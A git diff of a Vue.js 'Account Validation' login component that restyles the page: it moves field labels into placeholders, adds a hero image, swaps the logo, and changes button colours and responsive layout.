@@ -1,15 +1,14 @@
 <template>
   <div
     class="hello"
-    style="display: flex;
-    justify-content: center;"
+    style=""
   >
     <div class="container">
-      <div style="display: flex; justify-content: center;">
+      <div style="display: flex;justify-content: center;">
         <div style="height: 120px; width: 120px;">
           <img
             style="width: 100%; height: 100%;"
-            src="../assets/settings.png"
+            src="../assets/logo1.jpeg"
             alt=""
           />
         </div>
@@ -17,14 +16,10 @@
 
       <div class="title">
         <h3></h3>
-
-        <!-- <div class="title-tab">
-          <span>Account Validation</span>
-        </div> -->
       </div>
 
       <h2 style="text-align: center;">Account Validation</h2>
-      <div class="divider"></div>
+      <!-- <div class="divider"></div> -->
       <el-form
         :label-position="labelPosition"
         :model="ruleForm"
@@ -33,14 +28,21 @@
         label-width="120px"
         class="demo-ruleForm"
       >
-        <el-form-item label="Email Address/Username" prop="name">
-          <el-input v-model="ruleForm.name"></el-input>
+        <el-form-item prop="name">
+          <el-input
+            placeholder="Email Address/Username"
+            v-model="ruleForm.name"
+          ></el-input>
         </el-form-item>
-        <el-form-item label="Password" prop="password">
-          <el-input type="password" v-model="ruleForm.password"></el-input>
+        <el-form-item prop="password">
+          <el-input
+            placeholder="Password"
+            type="password"
+            v-model="ruleForm.password"
+          ></el-input>
         </el-form-item>
         <div
-        style="margin-top: 1rem;"
+          style="margin-top: 1rem;"
           class="g-recaptcha"
           data-sitekey="6LendeAZAAAAANQ9d2W0hNfT4JPpihKgVN9pWerd"
         ></div>
@@ -55,7 +57,7 @@
           >
         </el-form-item>
       </el-form>
-      <div class="divider"></div>
+      <!-- <div class="divider"></div> -->
 
       <!-- <p class="terms">
         if you click the authentication/activation link, you will be registered
@@ -66,7 +68,9 @@
         &nbsp; and &nbsp;
         <span @click="openDialog('Privacy Policy')">Privacy Policy</span>
       </p> -->
+
       <ul style="list-style-type: unset;">
+        <h3 style="margin-bottom: 30px;">Note</h3>
         <li style="font-size: 11px; display: list-item;">
           The information collected is confidential and will not be disclosed by
           us to unauthorized third parties.
@@ -84,12 +88,22 @@
       </ul>
     </div>
 
-    <el-dialog :title="modalHeader" :visible.sync="dialogVisible" width="90%">
+    <div class="img-hero">
+      <img
+        style="    height: 100%; width:100%;
+    object-fit: cover;
+"
+        src="../assets/Bot1.jpg"
+        alt=""
+      />
+    </div>
+
+    <!-- <el-dialog :title="modalHeader" :visible.sync="dialogVisible" width="90%">
       <span>{{ modalBody }}</span>
       <span slot="footer" class="dialog-footer">
         <el-button @click="dialogVisible = false">Cancel</el-button>
       </span>
-    </el-dialog>
+    </el-dialog> -->
   </div>
 </template>
 
@@ -194,6 +208,7 @@ h3 {
 ul {
   list-style-type: none;
   padding: 0;
+  margin-top: 6rem;
 }
 li {
   display: inline-block;
@@ -209,15 +224,20 @@ a {
 }
 
 .container {
-  width: 30%;
+  width: 40%;
+  padding: 4rem;
+}
+
+.img-hero {
+  width: 60%;
 }
 
 .hello .el-button--primary {
   width: 100%;
-  height: 50px;
+  height: 38px;
   margin-top: 0.3rem;
-  background: limegreen;
-  border-color: limegreen;
+  background-color: #007bff;
+  border-color: #007bff;
 }
 
 .hello .el-form-item__content .el-input input {
@@ -226,6 +246,13 @@ a {
 
 .hello .title h3 {
   text-align: center;
+}
+
+.hello {
+  display: flex;
+  justify-content: center; 
+  height: 100vh;
+  overflow: hidden
 }
 
 .terms {
@@ -265,6 +292,14 @@ a {
   .container {
     width: 100%;
     padding: 20px;
+  }
+
+  .img-hero {
+    display: none;
+  }
+
+  .hello {
+    overflow: auto;
   }
 }
 </style>
